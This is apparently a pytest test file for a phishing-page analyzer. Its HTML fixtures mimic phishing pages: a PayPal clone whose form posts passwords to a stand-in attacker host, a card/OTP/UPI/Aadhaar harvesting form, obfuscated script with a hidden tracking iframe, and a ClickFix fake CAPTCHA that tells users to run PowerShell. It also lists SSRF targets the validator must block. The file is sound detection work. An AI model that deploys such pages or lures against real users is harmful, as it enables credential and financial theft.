import uuid
import pytest
from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession

from app.models.scan import Scan
from app.models.scan_finding import ScanFinding
from app.services.content_analyzer import (
    is_safe_url,
    get_base_domain,
    analyze_html,
    analyze_content,
    save_findings_to_db,
)

# ---------------------------------------------------------------------------
# MOCKED HTML FIXTURES
# ---------------------------------------------------------------------------

HTML_PAYPAL_PHISHING = """
<!DOCTYPE html>
<html>
<head>
    <title>Log in to your PayPal account</title>
    <meta property="og:site_name" content="PayPal" />
</head>
<body>
    <div class="header">
        <img src="https://attacker-cdn.com/paypal_logo.png" alt="PayPal Logo" />
        <h2>Sign in to PayPal</h2>
    </div>
    <div class="urgent-banner">
        <p>Warning: Your account has been suspended! Immediate action is required to verify your account.</p>
    </div>
    <!-- Phishing form submitting credentials to third-party attacker server -->
    <form action="http://attacker-exfiltration.xyz/stealer.php" method="POST">
        <input type="text" name="email" placeholder="Email address" />
        <input type="password" name="password" placeholder="Password" />
        <button type="submit">Log In</button>
    </form>
</body>
</html>
"""

HTML_FINANCIAL_HARVESTING = """
<!DOCTYPE html>
<html>
<head><title>Secure Banking Verification</title></head>
<body>
    <h2>Complete KYC and Card Verification</h2>
    <form action="/verify" method="POST">
        <label>Debit/Credit Card Number</label>
        <input type="text" name="card_number" placeholder="xxxx-xxxx-xxxx-xxxx" />
        
        <label>CVV Code</label>
        <input type="password" name="cvv" placeholder="123" />
        
        <label>Card Expiry</label>
        <input type="text" name="exp_date" placeholder="MM/YY" />
        
        <label>Enter 6-digit OTP</label>
        <input type="text" name="otp_code" placeholder="Enter OTP received" />
        
        <label>UPI ID / VPA</label>
        <input type="text" name="upi_id" placeholder="user@okhdfcbank" />
        
        <label>UPI PIN</label>
        <input type="password" name="upi_pin" placeholder="Enter 6 digit PIN" />
        
        <label>Aadhaar Number</label>
        <input type="text" name="aadhaar_number" placeholder="xxxx-xxxx-xxxx" />
        
        <label>PAN Card Number</label>
        <input type="text" name="pan_number" placeholder="ABCDE1234F" />

        <button type="submit">Verify Now</button>
    </form>
</body>
</html>
"""

HTML_SUSPICIOUS_SCRIPTS_AND_IFRAME = """
<!DOCTYPE html>
<html oncontextmenu="return false;">
<head>
    <title>Document Portal</title>
    <script>
        // Obfuscated payload unpacker
        eval(unescape('%77%69%6E%64%6F%77%2E%6C%6F%63%61%74%69%6F%6E'));
    </script>
</head>
<body>
    <h1>Protected Document</h1>
    <form action="/login" method="POST">
        <!-- 6 Hidden input fields -->
        <input type="hidden" name="token1" value="a" />
        <input type="hidden" name="token2" value="b" />
        <input type="hidden" name="token3" value="c" />
        <input type="hidden" name="token4" value="d" />
        <input type="hidden" name="token5" value="e" />
        <input type="hidden" name="token6" value="f" />
        <input type="text" name="username" />
        <input type="password" name="password" />
    </form>
    <!-- Concealed stealth iframe -->
    <iframe src="http://hidden-tracker.xyz/beacon" width="0" height="0" style="display:none;"></iframe>
</body>
</html>
"""

HTML_CLICKFIX_FAKE_CAPTCHA = """
<!DOCTYPE html>
<html>
<head><title>Cloudflare Robot Verification</title></head>
<body>
    <div class="captcha-box">
        <h3>Verify You Are Human</h3>
        <p>To verify that you are not a bot, press <strong>Windows + R</strong>, then paste the code using Ctrl + V, and hit Enter.</p>
        <code>powershell -encodedCommand JABhAD0...</code>
    </div>
</body>
</html>
"""

HTML_BENIGN_BLOG = """
<!DOCTYPE html>
<html>
<head>
    <title>Open Source Tech Articles - DevBlog</title>
</head>
<body>
    <header>
        <nav><a href="/">Home</a> | <a href="/about">About Us</a></nav>
    </header>
    <main>
        <h1>Building Modern Distributed Applications with Python</h1>
        <p>In this tutorial, we will explore asynchronous programming and clean database design patterns.</p>
    </main>
    <footer>
        <p>&copy; 2026 DevBlog Foundation. All rights reserved.</p>
    </footer>
</body>
</html>
"""


# ---------------------------------------------------------------------------
# UNIT TESTS
# ---------------------------------------------------------------------------

def test_ssrf_protection():
    """Verify SSRF validation blocks private IPs, loopback, and metadata endpoints."""
    assert is_safe_url("http://127.0.0.1/admin", resolve_dns=False) is False
    assert is_safe_url("http://localhost:8000", resolve_dns=False) is False
    assert is_safe_url("http://10.0.0.15/secret", resolve_dns=False) is False
    assert is_safe_url("http://192.168.1.1/router", resolve_dns=False) is False
    assert is_safe_url("http://172.16.0.5/api", resolve_dns=False) is False
    assert is_safe_url("http://169.254.169.254/latest/meta-data/", resolve_dns=False) is False
    assert is_safe_url("http://router.home.lan/config", resolve_dns=False) is False
    assert is_safe_url("ftp://example.com/file", resolve_dns=False) is False
    assert is_safe_url("file:///etc/passwd", resolve_dns=False) is False
    assert is_safe_url("https://example.com/articles", resolve_dns=False) is True


def test_get_base_domain():
    """Verify domain extraction handles subdomains and multi-part TLDs."""
    assert get_base_domain("https://sub.login.paypal.com/signin") == "paypal.com"
    assert get_base_domain("https://evil-phish.co.uk/page") == "evil-phish.co.uk"
    assert get_base_domain("verify-account-12.com:8080") == "verify-account-12.com"


def test_paypal_phishing_detection():
    """
    Test PayPal brand impersonation on an unofficial domain with third-party
    credential exfiltration.
    """
    phish_url = "http://secure-paypal-update.xyz/login.html"
    result = analyze_html(HTML_PAYPAL_PHISHING, phish_url)

    assert result.has_login_form is True
    assert result.has_credential_harvesting is True
    assert "PayPal" in result.detected_brands
    assert "PayPal" in result.brand_mismatches
    assert result.max_severity == "critical"
    assert result.total_risk_points >= 40

    # Ensure structured findings contain brand impersonation and third-party form
    finding_titles = [f.title for f in result.findings]
    assert any("Brand Impersonation" in title for title in finding_titles)
    assert any("Third-Party Credential Exfiltration" in title for title in finding_titles)
    assert any("Account Suspension" in title for title in finding_titles)


def test_sensitive_financial_and_identity_inputs():
    """
    Test detecting OTP, payment card, UPI, Aadhaar, and PAN harvesting fields.
    """
    test_url = "https://bank-kyc-portal.online/verify"
    result = analyze_html(HTML_FINANCIAL_HARVESTING, test_url)

    assert "OTP / 2FA" in result.sensitive_fields
    assert "Payment Card (PAN/CVV)" in result.sensitive_fields
    assert "UPI ID / PIN" in result.sensitive_fields
    assert "Government ID (Aadhaar/PAN/SSN)" in result.sensitive_fields

    finding_titles = [f.title for f in result.findings]
    assert any("One-Time Password (OTP)" in title for title in finding_titles)
    assert any("Payment Card Details" in title for title in finding_titles)
    assert any("UPI Financial PIN" in title for title in finding_titles)
    assert any("National Identity Number" in title for title in finding_titles)
    assert result.total_risk_points >= 50


def test_suspicious_scripts_and_hidden_elements():
    """
    Test detecting eval/unescape obfuscation, context-menu suppression,
    hidden iframes, and excessive hidden fields.
    """
    test_url = "https://portal-docs.download/view"
    result = analyze_html(HTML_SUSPICIOUS_SCRIPTS_AND_IFRAME, test_url)

    assert result.has_login_form is True
    assert result.hidden_inputs_count == 6
    assert len(result.suspicious_scripts) > 0

    finding_titles = [f.title for f in result.findings]
    assert any("JavaScript Obfuscation" in title for title in finding_titles)
    assert any("Right-Click Context Menu" in title for title in finding_titles)
    assert any("Hidden or Zero-Dimension Iframe" in title for title in finding_titles)
    assert any("Excessive Hidden Form Fields" in title for title in finding_titles)


def test_clickfix_fake_captcha_detection():
    """
    Test detecting malicious ClickFix PowerShell execution directives.
    """
    test_url = "https://cloudflare-verify.xyz/challenge"
    result = analyze_html(HTML_CLICKFIX_FAKE_CAPTCHA, test_url)

    assert result.max_severity == "critical"
    finding_titles = [f.title for f in result.findings]
    assert any("ClickFix" in title for title in finding_titles)


def test_benign_website_analysis():
    """
    Verify benign website produces no phishing findings or brand mismatches.
    """
    test_url = "https://mytechblog.org/articles/python"
    result = analyze_html(HTML_BENIGN_BLOG, test_url)

    assert result.has_login_form is False
    assert result.has_credential_harvesting is False
    assert len(result.brand_mismatches) == 0
    assert len(result.sensitive_fields) == 0
    assert result.total_risk_points == 0
    assert result.max_severity == "info"
    assert "No significant phishing" in result.summary


@pytest.mark.asyncio
async def test_database_persistence_of_findings(db_session: AsyncSession):
    """
    Test end-to-end integration: analyze HTML and save findings directly to database.
    """
    # 1. Create a Scan record
    scan = Scan(
        input_url="http://fake-paypal-verify.xyz/login",
        normalized_url="http://fake-paypal-verify.xyz/login",
        status="running",
    )
    db_session.add(scan)
    await db_session.commit()
    await db_session.refresh(scan)

    # 2. Run content analyzer with scan_id and db
    result = await analyze_content(
        url=scan.normalized_url,
        scan_id=scan.id,
        html=HTML_PAYPAL_PHISHING,
        db=db_session,
    )

    assert len(result.findings) >= 2

    # 3. Query scan_findings from database
    query = select(ScanFinding).where(ScanFinding.scan_id == scan.id)
    exec_res = await db_session.execute(query)
    saved_findings = exec_res.scalars().all()

    assert len(saved_findings) == len(result.findings)

    # Verify attributes and JSON evidence
    for f in saved_findings:
        assert f.scan_id == scan.id
        assert f.category in ("credential_harvesting", "brand_impersonation", "deceptive_content")
        assert f.severity in ("critical", "high", "medium")
        assert f.risk_points > 0
        assert isinstance(f.evidence, dict)
        assert f.description != ""
